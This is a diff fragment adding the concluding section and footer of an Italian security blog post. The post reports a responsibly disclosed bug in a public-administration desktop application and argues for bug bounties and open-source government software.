+<p>Pur quanto fosse molto semplice accorgersi del bug, lo sviluppo dell’exploit non è stato altrettanto facile. Detto questo, non sarebbe male se in Italia fosse istituito un programma di bug bounty per gli applicativi della PA, cosicché falle di sicurezza come quella presentata in questo post, verrebbero segnalate e sistemate più velocemente e, soprattutto, non utilizzate da malintenzionati.</p>
+
+<p>Al momento ci sono delle linee guida sulla responsible disclosure per alcuni applicativi come PagoPA, ma non vengono offerte ricompense a chi segnala problemi di sicurezza, il che non incoraggia appassionati ed esperti a spendere del tempo alla ricerca di problemi. Qui un esempio di cosa ha portato l’iniziativa <a href="https://www.hackerone.com/hack-the-pentagon">Hack The Pentagon</a>:</p>
+
+<p><img src="/assets/files/DesktopTelematico/htp.png" alt="Hack the Pentagon" /></p>
+
+<p>Inoltre, sia per un fattore di trasparenza nei confronti dei cittadini, sia per permettere a questi di contribuire alla risoluzione di problemi sugli applicativi pubblici, sarebbe ideale rendere i software rilasciati ed usati dalla pubblica amministrazione open source, <a href="https://publiccode.eu/it/">qui</a> vengono spiegati i vantaggi che comporterebbe.</p>
+
+<p>Sono rimasto colpito dalla prontezza con la quale il team di sviluppo Sogei sia riuscito a sistemare il problema, ho reportato il bug a capodanno e dopo circa una settimana il problema è stato preso in carico in modo molto professionale.</p>
+
+<p>Ringrazio Nicola Vella per i consigli sullo sviluppo dell’exploit, Jacopo Bonomi per le sue skills da letterato (e per come probabilmente cambierà le conclusioni), infine Alessio De Pauli per aver provato a fare magie coi bytecode di Java prima di scoprire quell’unzip.</p>
+
+  </article>
+</div>
+
+  </article>
+
+</div>
+
+            </main>
+          </div>
+        </div>
+
+        <div class="row">
+    <div class="col-lg-8 col-lg-offset-2">
+        <footer>
+            <div>
+                <div class="footer left column one-half">
+                    <small class="glow-yellow">
+                        Theme <a href="https://github.com/gildasio/clyell"> clyell</a> by <a
+                            href="https://github.com/gildasio/">gildasio</a> <br class="hidden visible-xs">powered by <a
+                            href="https://github.com/jekyll/jekyll">{{ jekyll }}</a>
+                    </small>
+                </div>
+
+                <div class="footer right column one-half">
+                    <section class="small-font">
+                        <a href="https://twitter.com/fibonhack"><span class="icon icon--twitter">
+    <svg viewBox="0 0 16 16">
+        <path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"/>
+    </svg>
+</span>
+</a>
+                        <a href="https://github.com/fibonhack"><span class="icon icon--github">
+    <svg viewBox="0 0 16 16">
+        <path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/>
+    </svg>
+</span>
+</a>
+                    </section>
+                </div>
+            </div>
+        </footer>
+    </div>
+</div>
+
+      </div>
+    </body>
+</html>
